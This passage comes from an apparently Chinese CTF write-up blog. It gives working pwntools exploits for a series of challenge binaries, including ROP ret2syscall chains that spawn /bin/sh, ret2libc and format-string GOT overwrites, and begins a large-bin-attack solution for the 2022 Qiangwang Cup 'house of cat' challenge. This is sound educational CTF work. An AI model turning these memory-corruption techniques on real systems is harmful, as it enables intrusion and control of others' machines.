class="number">0x0000000000449085</span></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000004005af</span></span><br><span class="line">syscall = <span class="number">0x000000000040129c</span></span><br><span class="line">binsh = <span class="number">0x6BC3A0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;yes or no?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="bin2"><a href="#bin2" class="headerlink" title="bin2"></a>bin2</h3><p>同上，不过是 32 位的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin2&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080488fc</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806e111</span></span><br><span class="line">syscall = <span class="number">0x080488f8</span></span><br><span class="line">binsh = <span class="number">0x80DA068</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x58</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(pop_eax_ret) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>)*<span class="number">2</span> + p32(binsh)</span><br><span class="line">payload += p32(syscall)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Please start your challenge\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="bin3"><a href="#bin3" class="headerlink" title="bin3"></a>bin3</h3><p>system 和 /bin/sh 都有。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309211427229.png" alt="image-20230921142755879" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin3&quot;</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x80485BB</span></span><br><span class="line">binsh = <span class="number">0x804B028</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x58</span>+<span class="number">4</span>) + p32(system) + p32(binsh)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;You still only have one input opportunity.\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="bin4"><a href="#bin4" class="headerlink" title="bin4"></a>bin4</h3><p>一道格式化字符串，有后门，在栈上找半天跳板打返回地址，甚至有了爆破的想法：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309211454991.png" alt="image-20230921145442791" style="zoom: 33%;" /><p>结果程序 relro 没开，打 .init_array 即可：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309211457913.png" alt="image-20230921145704759" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309211509081.png" alt="image-20230921150937751" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;b *0x400759&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x4006F8</span></span><br><span class="line"><span class="comment"># payload = b&#x27;%252c%8$hhn&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;%248c%8$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span></span><br><span class="line">payload += p64(<span class="number">0x6009B8</span>)</span><br><span class="line">io.sendafter(<span class="string">b&quot;Welcome to RHG! Enter your fmt &gt;&gt;&gt;\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="bin5"><a href="#bin5" class="headerlink" title="bin5"></a>bin5</h3><p>也是 ret2syscall。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309211517040.png" alt="image-20230921151736858" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin5&quot;</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x6BA0F0</span></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000004005af</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004006a6</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x00000000004105c3</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000449575</span></span><br><span class="line">syscall = <span class="number">0x000000000040129c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;elf file!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h2><h3 id="bin20"><a href="#bin20" class="headerlink" title="bin20"></a>bin20</h3><p>64 位栈溢出，binsh 和 system 都有。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin20&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004007d3</span></span><br><span class="line">binsh = <span class="number">0x0602048</span></span><br><span class="line">system = <span class="number">0x40070B</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="bin21"><a href="#bin21" class="headerlink" title="bin21"></a>bin21</h3><p>栈溢出，有后门，注意对齐。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin21&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4006E8</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(backdoor+<span class="number">1</span>)</span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *0x400740&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="bin22"><a href="#bin22" class="headerlink" title="bin22"></a>bin22</h3><p>动态链接的 32 位，无后门，需要 ret2libc，注意链子的构造。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin22&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bin22&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;how much character do you want to send?\n&quot;</span>, <span class="string">b&#x27;50&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += p32(elf.sym[<span class="string">&quot;puts&quot;</span>]) + p32(elf.sym[<span class="string">&quot;main&quot;</span>]) + p32(elf.got[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *0x804867B&quot;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">libc_base = u32(io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:]) - <span class="number">0x73260</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base ==&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># print(hex(elf.sym[&quot;puts&quot;]))q</span></span><br><span class="line"></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;how much character do you want to send?\n&quot;</span>, <span class="string">b&#x27;50&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += p32(system) + p32(elf.sym[<span class="string">&quot;main&quot;</span>]) + p32(binsh)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="bin23"><a href="#bin23" class="headerlink" title="bin23"></a>bin23</h3><p>跟 day1 的 bin5 大差不差。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin23&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000004005af</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004006a6</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x00000000004105c3</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000449575</span></span><br><span class="line">syscall = <span class="number">0x000000000040129c</span></span><br><span class="line">binsh = <span class="number">0x493328</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;elf file!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="bin24"><a href="#bin24" class="headerlink" title="bin24"></a>bin24</h3><p>格式化字符串，第一次泄露 libc，第二次劫持 printf_got 为 system，计算偏移有些麻烦。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309211944021.png" alt="image-20230921194450754" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./bin24&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = <span class="number">0x601028</span></span><br><span class="line">payload = <span class="string">b&#x27;%39$p&#x27;</span></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x100, b&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment"># offset = 0x7f0df258e040 - 0x7f0df2200000</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *0x400790&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>) - (<span class="number">0x7fd389229d90</span> - <span class="number">0x7fd389200000</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc_base ==&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">printf = libc_base + libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;printf ==&gt; &quot;</span>+<span class="built_in">hex</span>(printf))</span><br><span class="line">log.success(<span class="string">&quot;system ==&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">off1 = (system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">off2 = (system &amp; <span class="number">0xffff</span>) -off1-<span class="number">4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(off1).encode() + <span class="string">b&quot;c&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%10$hhn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">16</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>(off2).encode() + <span class="string">b&quot;c&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%11$hn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">32</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(printf_got+<span class="number">2</span>) + p64(printf_got)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *0x400790&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2022强网杯初赛"><a href="#2022强网杯初赛" class="headerlink" title="2022强网杯初赛"></a>2022强网杯初赛</h1><h2 id="1-house-of-cat"><a href="#1-house-of-cat" class="headerlink" title="1. house of cat"></a>1. house of cat</h2><p>先忽略逆向问题，看一下菜单：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309251950662.png" alt="image-20230925195005578" style="zoom:50%;" /><p>add 功能函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 choice; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  print(<span class="string">&quot;plz input your cat idx:\n&quot;</span>);</span><br><span class="line">  choice = get_choice();</span><br><span class="line">  <span class="keyword">if</span> ( choice &gt; <span class="number">0xF</span> || *(&amp;heap + choice) )      <span class="comment">// 最多申请16个堆块</span></span><br><span class="line">    <span class="keyword">return</span> print(<span class="string">&quot;invalid!\n&quot;</span>);</span><br><span class="line">  print(<span class="string">&quot;plz input your cat size:\n&quot;</span>);</span><br><span class="line">  size = get_choice();</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x417</span> || size &gt; <span class="number">0x46F</span> )          <span class="comment">// size大小在0x418~0x468</span></span><br><span class="line">    <span class="keyword">return</span> print(<span class="string">&quot;invalid size!\n&quot;</span>);</span><br><span class="line">  *(&amp;heap + choice) = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">  <span class="keyword">if</span> ( !*(&amp;heap + choice) )</span><br><span class="line">    <span class="keyword">return</span> print(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">  heap_size[choice] = size;</span><br><span class="line">  print(<span class="string">&quot;plz input your content:\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, *(&amp;heap + choice), heap_size[choice]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete 功能函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 choice; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  print(<span class="string">&quot;plz input your cat idx:\n&quot;</span>);</span><br><span class="line">  choice = get_choice();</span><br><span class="line">  <span class="keyword">if</span> ( choice &lt;= <span class="number">0xF</span> &amp;&amp; *(&amp;heap + choice) )</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;heap + choice));                    <span class="comment">// UAF漏洞</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    print(<span class="string">&quot;invalid!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show 功能函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sub_188C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 choice; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  print(<span class="string">&quot;plz input your cat idx:\n&quot;</span>);</span><br><span class="line">  choice = get_choice();</span><br><span class="line">  <span class="keyword">if</span> ( choice &gt; <span class="number">0xF</span> || !*(&amp;heap + choice) )</span><br><span class="line">    <span class="keyword">return</span> print(<span class="string">&quot;invalid!\n&quot;</span>);</span><br><span class="line">  print(<span class="string">&quot;Context:\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, *(&amp;heap + choice), <span class="number">0x30</span>uLL);<span class="comment">//泄露0x30大小且不会被\x00截断</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit 功能函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 choice; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( two_chance &lt;= <span class="number">0</span> )<span class="comment">//两次机会</span></span><br><span class="line">    <span class="keyword">return</span> print(<span class="string">&quot;nonono!!!!\n&quot;</span>);</span><br><span class="line">  --two_chance;</span><br><span class="line">  print(<span class="string">&quot;plz input your cat idx:\n&quot;</span>);</span><br><span class="line">  choice = get_choice();</span><br><span class="line">  <span class="keyword">if</span> ( choice &gt; <span class="number">0xF</span> || !*(&amp;heap + choice) )</span><br><span class="line">    <span class="keyword">return</span> print(<span class="string">&quot;invalid!\n&quot;</span>);</span><br><span class="line">  print(<span class="string">&quot;plz input your content:\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, *(&amp;heap + choice), <span class="number">0x30</span>uLL);<span class="comment">//修改0x30大小</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然可以进行 largebin_attack，且允许两次。</p><p>另外题目开启了沙箱，需要 orw。</p><h3 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h3><p>示例如下：</p><ol><li>申请一个 0x428 大小的 chunk0，申请另一个堆防止合并。</li><li>释放 chunk0 进入 unsorted_bin。</li><li>申请一个 0x438 大小（&gt;0x428）的 chunk1，chunk0 进入 large_bin。</li><li>申请一个 0x418 大小的 chunk2，申请另一个堆防止合并。</li><li>释放 chunk2 进入 unsorted+bin。</li><li>修改 chunk0 的 bk_next 为 target-0x20。</li><li>申请一个 0x438 大小的 chunk3，target 被写入 chunk2 的内容。</li></ol><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p>思路：由于 stderr 在 libc 上，因此可以打 stderr+__malloc_assert：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">         <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">             __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             file, line,</span><br><span class="line">             function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序无法正常退出，因此可以通过改小 top_chunk 触发 __malloc_assert。并且我们还需绕过指针保护，保护指针的值位于 fs[0x30] 即 pointer_guard，这是在 libc 下面的一块空间。（ubuntu2.35-0-3是有的，ubuntu2.35-0-3.3就比较奇怪） </p><p>由于可以申请的堆块在 0x418~0x468，并且可以修改两次，利用一次 largebin_attack 劫持 stderr，利用一次 largebin_attack 劫持 pointer_guard，最后利用 large_bin 的 UAF 构造堆风水修改 top_chunk 的 size，再申请一个大堆块触发 __malloc_attack。</p><p>这里参考 verfish 师傅的脚本，说一下几个重要的过程：</p><ol><li>泄露 libc 和 heap 基址，堆块 0 先进入 unsortedbin，又由于申请了更大的堆块进入了 largebin：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x428</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x428</span>, <span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x448</span>, <span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x448</span>, <span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><ol start="2"><li>再将 largebin 中的堆块申请回来用于下一次 largebin_attack：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>, <span class="number">0x428</span>, <span class="string">&#x27;verf1sh&#x27;</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li>申请存放 io_file 的偏小堆块，此时需要将 io_file 写入，因为 edit 只有两次机会，不能浪费，并释放一个偏大堆块进入 unsortedbin：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">3</span>, <span class="number">0x418</span>, fake_file)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><ol start="4"><li>再申请一个大堆块，填入 orw 